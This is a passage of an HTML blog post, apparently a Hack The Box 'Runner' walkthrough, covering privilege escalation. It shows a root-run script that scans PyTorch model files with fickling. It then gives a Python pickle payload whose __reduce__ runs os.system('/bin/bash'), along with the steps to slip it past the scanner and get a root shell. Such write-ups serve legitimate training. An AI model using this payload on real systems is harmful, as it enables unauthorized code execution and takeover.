+</span></span><span class="line"><span class="cl">    /usr/bin/unzip -q <span class="s2">&#34;</span><span class="nv">$MODEL_FILE</span><span class="s2">&#34;</span> -d <span class="s2">&#34;</span><span class="nv">$TEMP_DIR</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/echo <span class="s2">&#34;[!] Unknown or unsupported file format for </span><span class="nv">$MODEL_FILE</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">2</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/bin/find <span class="s2">&#34;</span><span class="nv">$TEMP_DIR</span><span class="s2">&#34;</span> -type f <span class="se">\(</span> -name <span class="s2">&#34;*.pkl&#34;</span> -o -name <span class="s2">&#34;pickle&#34;</span> <span class="se">\)</span> -print0 <span class="p">|</span> <span class="k">while</span> <span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> -r -d <span class="s1">$&#39;\0&#39;</span> extracted_pkl<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">fickling_output</span><span class="o">=</span><span class="k">$(</span>/usr/local/bin/fickling -s --json-output /dev/fd/1 <span class="s2">&#34;</span><span class="nv">$extracted_pkl</span><span class="s2">&#34;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> /usr/bin/echo <span class="s2">&#34;</span><span class="nv">$fickling_output</span><span class="s2">&#34;</span> <span class="p">|</span> /usr/bin/jq -e <span class="s1">&#39;select(.severity == &#34;OVERTLY_MALICIOUS&#34;)&#39;</span> &gt;/dev/null<span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">        /usr/bin/echo <span class="s2">&#34;[!] Model </span><span class="nv">$MODEL_FILE</span><span class="s2"> contains OVERTLY_MALICIOUS components and will be deleted.&#34;</span>
+</span></span><span class="line"><span class="cl">        /bin/rm <span class="s2">&#34;</span><span class="nv">$MODEL_FILE</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/bin/find <span class="s2">&#34;</span><span class="nv">$TEMP_DIR</span><span class="s2">&#34;</span> -type f -exec /bin/rm <span class="o">{}</span> +
+</span></span><span class="line"><span class="cl">/bin/rm -rf <span class="s2">&#34;</span><span class="nv">$TEMP_DIR</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> -f <span class="s2">&#34;</span><span class="nv">$MODEL_FILE</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/echo <span class="s2">&#34;[+] Model </span><span class="nv">$MODEL_FILE</span><span class="s2"> is considered safe. Processing...&#34;</span>
+</span></span><span class="line"><span class="cl">    /usr/bin/python3 <span class="s2">&#34;</span><span class="nv">$PYTHON_SCRIPT</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$MODEL_FILE</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span></code></pre></div><p>Luckily, it is a Bash script. Again, our thoughts are to use a malicious pickle file to spawn a root shell. Doing some investigation, we hve found the tool <a href="https://github.com/trailofbits/fickling"  class="external-link" target="_blank" rel="noopener">Fickling</a> that can decompile and inject code into pickle files. This tool is also the one used to check the safety of pickle files in the above script. So, lets try to inject some malicious code into a data.pkl file.</p>
+<p>First, we have to get an example model.pth file where whe can inject our bad pickle. We can do this with the help from <a href="https://machinelearningmastery.com/save-and-load-your-pytorch-models/"  class="external-link" target="_blank" rel="noopener">this article</a></p>
+<p>With our model.pth generated, we can try to inject a /bin/bash command and see if it is flagged as malicious:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">python ~/.local/bin/fickling --inject <span class="s2">&#34;/bin/bash&#34;</span> data.pkl 
+</span></span></code></pre></div><p><img src="Scr_13.png" alt="image"></p>
+<p>And it isn&rsquo;t flagged as &ldquo;Otterly Malicious&rdquo;, so SUCCESS. We now can integrate this data.pkl file in our model.pth file using 7z.</p>
+<p><img src="Scr_14.png" alt="image"></p>
+<p>Now we can upload it to the victim machine, in the /models/ folder using wget and simple-http-server.</p>
+<p><img src="Scr_15.png" alt="image"></p>
+<p>But oops, it errors out. Maybe Fickling isn&rsquo;t the best approach, since it breaks the pickle file. We can create a malicious pkl file ourselves tho, using the following script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ArbitraryCode</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create an instance of the class</span>
+</span></span><span class="line"><span class="cl"><span class="n">obj</span> <span class="o">=</span> <span class="n">ArbitraryCode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Serialize the object to a pickle file</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;code2.pkl&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pickle</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Pickle created&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>And again add it to model.pth with 7z.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">python model.py <span class="c1">#Create a new model - not corrupted</span>
+</span></span><span class="line"><span class="cl">7z a model.pth code2.pkl <span class="c1">#Add the pickle to the model file</span>
+</span></span><span class="line"><span class="cl">simple-http-server --index <span class="c1">#Start the http server to download the file on the victim machine</span>
+</span></span></code></pre></div><p>Still errors. After a lot of trying, it looks like 7z is having trouble replacing the data.pkl file, which in turn messes up the script on the victim machine.</p>
+<p>The solution is to use the native kali GUI to open the .pth file and replace the data.pkl file with the Engrampa GUI.</p>
+<p><img src="Scr_16.png" alt="image"></p>
+<p>And just like that, the machine is rooted!</p>
+<p><img src="Scr_5.png" alt="image"></p>
+<p>That was a wild ride.</p>
+<h2 id="conclusion">
+  Conclusion
+  <a class="heading-link" href="#conclusion">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Hacking through the Runner HTB machine provides valuable insights into penetration testing techniques, including enumeration, vulnerability exploitation, and privilege escalation. By understanding these steps, aspiring ethical hackers like me can enhance their skills and contribute positively to the cybersecurity landscape.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3 id="see-also-in-htb">
+        See also in HTB
+        <a class="heading-link" href="#see-also-in-htb">
+          <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+          <span class="sr-only">Link to heading</span>
+        </a>
+      </h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/posts/htb_runner/">Runner HTB Walkthrough</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/htb_boardlight/">BoardLight HTB Walkthrough</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/htb_usage/">Usage HTB Walkthrough</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/htb_monitored/">Monitored HTB Walkthrough</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/htb_bizness/">Bizness HTB Walkthrough</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        
+        
+        
+        
+        
+
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2023 -
+    
+    2024
+     Dennis Drebitca 
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
